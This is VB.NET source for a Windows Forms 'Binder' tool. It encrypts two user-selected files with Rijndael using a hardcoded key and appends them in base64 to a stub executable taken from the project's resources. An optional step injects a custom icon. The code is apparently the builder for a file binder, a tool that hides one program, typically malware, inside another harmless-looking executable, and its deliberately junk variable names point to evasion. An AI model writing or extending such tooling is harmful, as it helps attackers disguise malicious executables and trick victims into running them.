Public Class Binder
    Dim XOXOXOXOOXOXOOXOOXOXOOXOXOX, XOIJSOIJDOIJAOSIDJOIJASD As String

#Region "Buttons"
    Private Sub CyberTopButton1_Click(sender As System.Object, e As System.EventArgs) Handles CyberTopButton1.Click
        Me.Close()
    End Sub
#End Region
   

#Region "Rijndael -SECURE-UNSECURE-"


    Function Secure(ByVal data As Byte()) As Byte()
        Using SA As New System.Security.Cryptography.RijndaelManaged
            SA.IV = New Byte() {1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6, 7}
            SA.Key = New Byte() {7, 6, 5, 4, 3, 2, 1, 9, 8, 7, 6, 5, 4, 3, 2, 1}
            Return SA.CreateEncryptor.TransformFinalBlock(data, 0, data.Length)
        End Using
    End Function
    Function Unsecure(ByVal data As Byte()) As Byte()
        Using SA As New System.Security.Cryptography.RijndaelManaged
            SA.IV = New Byte() {1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6, 7}
            SA.Key = New Byte() {7, 6, 5, 4, 3, 2, 1, 9, 8, 7, 6, 5, 4, 3, 2, 1}
            Return SA.CreateDecryptor.TransformFinalBlock(data, 0, data.Length)
        End Using
    End Function
#End Region


   


    Private Sub CyberButton1_Click(sender As System.Object, e As System.EventArgs) Handles CyberButton1.Click
        Try
            Dim S As New SaveFileDialog
            With S
                .FileName = "*.exe"
                .Filter = "Executable files (*.exe)|*.exe|All files (*.*)|*.*"
                .InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
                .Title = "Choose an output directory..."
                If .ShowDialog = Windows.Forms.DialogResult.OK Then
                    Dim POKSPDFOKSPO As Byte() = Secure(My.Computer.FileSystem.ReadAllBytes(CyberTextBox1.Text))
                    Dim oifjaosdifjoaisdjf As Byte() = Secure(My.Computer.FileSystem.ReadAllBytes(CyberTextBox2.Text))
                    Dim oijfadsoifjaosdfroert As String = "ofaijsdf9843j9f84ijoaew9m328qtiuhfeicwqh9t8m3449jf438j9gq8rjigoidflasfgorijge"
                    Dim Buffer As Byte() = My.Resources.BinderResource
                    My.Computer.FileSystem.WriteAllBytes(.FileName, Buffer, False)
                    IO.File.AppendAllText(.FileName, oijfadsoifjaosdfroert & Convert.ToBase64String(POKSPDFOKSPO) & oijfadsoifjaosdfroert & XOXOXOXOOXOXOOXOOXOXOOXOXOX & oijfadsoifjaosdfroert & Convert.ToBase64String(oifjaosdifjoaisdjf) & oijfadsoifjaosdfroert & XOIJSOIJDOIJAOSIDJOIJASD)
                    If CyberCheckBox1.CheckedState = True Then
                        IconChanger.InjectIcon(S.FileName, CyberTextBox3.Text)
                    Else
                    End If
                    MsgBox("Successfullly Binded!", MsgBoxStyle.Information + MsgBoxStyle.OkOnly, "Success")
                End If
            End With
        Catch ex As Exception
            MsgBox("Something Went Wrong!: " & ex.Message, MsgBoxStyle.Critical + MsgBoxStyle.OkOnly, "Error")
        End Try
    End Sub

    Private Sub CyberButton2_Click(sender As System.Object, e As System.EventArgs) Handles CyberButton2.Click
        Dim O As New OpenFileDialog
        With O
            .FileName = "*.*"
            .Filter = "All files (*.*)|*.*"
            .InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            .Title = "Choose a file..."
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                CyberTextBox1.Text = .FileName
                XOXOXOXOOXOXOOXOOXOXOOXOXOX = .SafeFileName
            End If
        End With
    End Sub

    Private Sub CyberButton3_Click(sender As System.Object, e As System.EventArgs) Handles CyberButton3.Click
        Dim O As New OpenFileDialog
        With O
            .FileName = "*.*"
            .Filter = "All files (*.*)|*.*"
            .InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            .Title = "Choose a file..."
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                CyberTextBox2.Text = .FileName
                XOIJSOIJDOIJAOSIDJOIJASD = .SafeFileName
            End If
        End With
    End Sub

    Private Sub CyberButton4_Click(sender As System.Object, e As System.EventArgs) Handles CyberButton4.Click
        Dim O As New OpenFileDialog
        With O
            .FileName = "*.ico*"
            .Filter = "Icons (*.ico*)|*.ico*"
            .InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            .Title = "Choose an icon..."
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                CyberTextBox3.Text = .FileName
            End If
        End With
    End Sub

  
End Class